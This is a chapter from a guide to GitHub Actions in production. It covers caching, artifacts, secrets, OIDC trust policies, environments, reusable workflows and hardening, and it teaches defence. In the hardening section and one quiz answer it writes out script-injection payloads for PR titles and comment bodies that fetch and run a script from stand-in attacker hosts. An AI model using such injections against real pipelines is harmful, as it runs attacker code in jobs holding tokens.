Actions in production

A workflow that runs is easy. A workflow that is fast, has credentials without storing them, can be reused across thirty repositories, and cannot be turned into a credential-exfiltration tool by a stranger's pull request title — that is a different job. Most of this chapter is about the last one, because CI is the most privileged code in most organisations.

Caching

The largest single speed-up available, and the easiest to get subtly wrong.

the standard shape
      - uses: actions/cache@v4
        id: cache
        with:
          path: |
            ~/.npm
            .next/cache
          key: node-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            node-${{ runner.os }}-
      - if: steps.cache.outputs.cache-hit != 'true'
        run: npm ci

Three rules govern the behaviour, and all three catch people:

  • An exact key hit means nothing is saved at the end. Caches are immutable per key, so if your key never changes, the cache never updates — a key without a lockfile hash produces a cache that is stale forever.
  • restore-keys are prefixes, tried in order, matching the most recently created entry. A partial hit is not an exact hit, so a new cache is saved.
  • Caches are scoped by branch. A run can restore caches created on its own branch or on the default branch, and nothing else — which is why the first run on a new branch is slow even though "the cache exists".

Use the built-in caching first

actions/setup-node, setup-python, setup-java and friends all take a cache: input that configures actions/cache correctly for that ecosystem — right paths, lockfile-hashed key, sensible restore keys. Hand-rolling actions/cache is for things they do not cover: build caches, container layers, compiled artefacts.

Artifacts versus cache

They look similar and are for opposite things.

CacheArtifact
HoldsRegenerable inputs — dependencies, build cachesOutputs you want to keep — binaries, reports, logs
If it is missingThe job is slowerThe job or a later one fails
ScopeBranch, with default-branch fallbackThe workflow run, downloadable by any later job
LifetimeEvicted when unused or over quotaA retention period you set

artifacts, including the v4 gotcha
      - uses: actions/upload-artifact@v4
        with:
          name: coverage-${{ matrix.os }}-${{ matrix.node }}   # unique per matrix job
          path: coverage/
          retention-days: 7
          if-no-files-found: error       # default is 'warn', which hides mistakes

      # in a later job
      - uses: actions/download-artifact@v4
        with:
          pattern: coverage-*
          merge-multiple: true

The v4 change that breaks old workflows: an artifact name can be uploaded once per run. A matrix that uploads to the same name used to merge silently and now fails, which is why every matrix upload needs the combination in its name and downloads use a pattern.

Secrets, variables and the token

Three separate mechanisms, three different scopes.

ThingContextNotes
Secretssecrets.NAMEMasked in logs; org, repository or environment scope; never sent to a fork's PR run
Variablesvars.NAMENot masked, not secret — for configuration like a region or a feature flag
GITHUB_TOKENsecrets.GITHUB_TOKENMinted per job, expires when it ends, scoped to this repository
least privilege for the token
permissions:
  contents: read          # everything else becomes 'none'

jobs:
  release:
    permissions:
      contents: write      # per-job override, only where needed
      id-token: write      # for OIDC, below
      pull-requests: write

Set permissions at the top of every workflow. Declaring it at all switches the token from whatever the organisation default is to exactly what you listed, which is the difference between "a compromised step can push to main" and "it can read the repository it is already reading".

Masking is not containment

GitHub replaces secret values with *** in logs, but only exact matches. Base64-encode a secret, split it across lines, or upload it in a file and the mask does nothing. Treat the log as public: a step that can read a secret can also exfiltrate it, so the control that matters is which steps run at all — not the masking.

OIDC: credentials without secrets

The single best change you can make to a deployment workflow.

Storing a cloud access key as a secret means a long-lived credential exists, in a place many people can add workflows to. OIDC removes it: GitHub mints a short-lived, signed token describing this specific workflow run, and your cloud provider is configured to trust tokens matching a precise description.

the workflow side
permissions:
  id-token: write        # required — without it there is no token to mint
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
          aws-region: eu-west-1
      - run: aws s3 sync dist/ s3://my-bucket/
the cloud side — the part that matters
"Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
    "token.actions.githubusercontent.com:sub": "repo:acme/api:ref:refs/heads/main"
  }
}

The sub claim is the identity. Its shape tells you what is being trusted:

sub conditionTrusts
repo:acme/api:ref:refs/heads/mainOnly runs on that branch of that repository
repo:acme/api:environment:productionOnly jobs using that environment — so its approval rules apply
repo:acme/api:pull_requestAny pull request run in that repository. Rarely what you want for deploy credentials
repo:acme/* with StringLikeEvery repository in the org — including a new one anybody creates
No sub condition at allEvery repository on GitHub. Anyone can assume your role
The misconfiguration that has burned real companies

A trust policy that checks only the issuer and audience — no sub — is satisfied by a token from any GitHub Actions run anywhere in the world. The fix is to always pin sub, prefer environment: over ref: so approvals gate it, and never use a bare StringLike wildcard on the repository segment. Chapter 16's environments are what make the environment form worth using.

Environments and approvals

Where "who may deploy" lives.

a job in an environment
jobs:
  deploy:
    environment:
      name: production
      url: https://api.acme.com
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
Environment settingEffect
Required reviewersThe job pauses until a named person or team approves it, in the run's UI
Wait timerA forced delay — a window in which to cancel
Deployment branch rulesOnly these branches or tags may deploy to it
Environment secrets and variablesOnly readable by jobs that declare this environment

Environment secrets are the mechanism worth internalising: a production credential attached to the production environment cannot be read by an arbitrary new workflow, because the job must declare the environment, and declaring it invokes the approval and branch rules. That converts "secret anyone can use" into "secret with a policy".

Reusable workflows and composite actions

Two ways to stop copying YAML into thirty repositories.

Reusable workflowComposite action
IsA whole workflow called by anotherA bundle of steps used inside a job
Defined byon: workflow_callaction.yml with runs.using: composite
Called withjobs.x.uses:steps.uses:
Controls jobs and runnersyesno — it runs in the caller's job
Sees secretsyes, passed or inheritedno — pass them as inputs
Right forA whole pipeline: build, test, publishA repeated sequence: set up the toolchain
calling a reusable workflow
jobs:
  ci:
    uses: acme/.github/.github/workflows/node-ci.yml@a1b2c3d
    with:
      node-version: 20
    secrets: inherit          # or list them individually, which is safer
    permissions:
      contents: read

secrets: inherit is convenient and hands the called workflow every secret the caller can see. Listing the two it needs is a one-line-per-secret cost that limits the blast radius if the shared workflow is ever compromised. Reusable workflows nest up to four levels deep, and a common organisation pattern is one repository holding them all, pinned by SHA from everywhere else.

Hardening

CI runs with more privilege than any human in the organisation. Treat it that way.

Script injection, the one that gets missed

An expression inside a run: block is substituted as text into the shell script before it runs. If that expression contains attacker-controlled data — a pull request title, an issue body, a branch name — the attacker is writing your shell script:

vulnerable
      - run: echo "Reviewing ${{ github.event.pull_request.title }}"
a PR titled: a"; curl evil.sh | bash; #
echo "Reviewing a"; curl evil.sh | bash; #"
safe — the value arrives as data, not as script
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Reviewing $PR_TITLE"

The rule is absolute: never interpolate untrusted context into run:. Pass it through env: and reference the environment variable, which the shell treats as a value.

The short version

Chapter 21 in eight lines

  • An exact cache-key hit saves nothing, so a key without a lockfile hash produces a cache that never updates. restore-keys are prefixes; a partial hit does save.
  • Caches are readable from the current branch and the default branch only — which is why a new branch starts cold.
  • Cache is for regenerable inputs, artifacts are for outputs. v4 artifact names are immutable per run, so matrix uploads need the combination in the name.
  • Declare permissions: in every workflow; masking secrets in logs is cosmetic, so what matters is which steps run at all.
  • OIDC removes the long-lived cloud key. Always pin the sub claim — with no sub condition, any Actions run on GitHub can assume your role.
  • Environment secrets have a policy attached, because a job must declare the environment and thereby accept its approval and branch rules.
  • Reusable workflows carry secrets and control jobs; composite actions are step bundles with no secrets context. Prefer listing secrets over inherit.
  • Never interpolate untrusted context into run: — pass it through env:. And pin third-party actions to a SHA, because tags move.

Check yourself

Your cache key is node-modules-v1 and installs are still slow after the first week. What is wrong?

The key is constant, so after the first run it is always an exact hit — and an exact hit means no new cache is written, because entries are immutable per key. The cache therefore froze with whatever the dependency tree looked like that day, and every run restores stale modules and then reinstalls the difference. Include the lockfile hash: node-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}, with node-${{ runner.os }}- as a restore key so a changed lockfile still gets a warm start.

A workflow does run: gh pr comment ${{ github.event.issue.number }} --body "Thanks, ${{ github.event.comment.body }}". What is the exploit, and the fix?

The comment body is substituted into the shell script as text, so a comment containing "; curl attacker.sh | bash; # executes arbitrary commands in a job that holds GITHUB_TOKEN and possibly more. The issue number is numeric and safer, but the body is fully attacker-controlled. Fix by passing both through env: and referencing $COMMENT_BODY — the shell then treats the value as data no matter what it contains. The linter above flags exactly this pattern.

Why is repo:acme/api:environment:production a better OIDC subject than repo:acme/api:ref:refs/heads/main?

Because the environment form makes the cloud role assumable only by a job that declared environment: production, and declaring it triggers that environment's protection rules — required reviewers, wait timers, deployment branch restrictions. The ref form trusts any job on main, including a new workflow file that someone merges to main, with no approval step. Both are far better than no sub condition at all, which trusts every Actions run on GitHub.

A colleague pins actions to @v4 and argues SHAs are unreadable churn. What is the counter-argument, and the compromise?

A tag is a mutable pointer (chapter 4): whoever controls the action's repository can move v4 to any commit, and every workflow in your organisation picks it up on the next run with no review and no notification. That is a supply-chain path straight into a job holding your tokens. The compromise is what most security-conscious teams do: pin the full SHA with the version in a trailing comment, and enable Dependabot for the github-actions ecosystem so updates arrive as reviewable pull requests rather than silently. Actions published by GitHub itself are the usual exception people allow, and even that is a judgement rather than a rule.
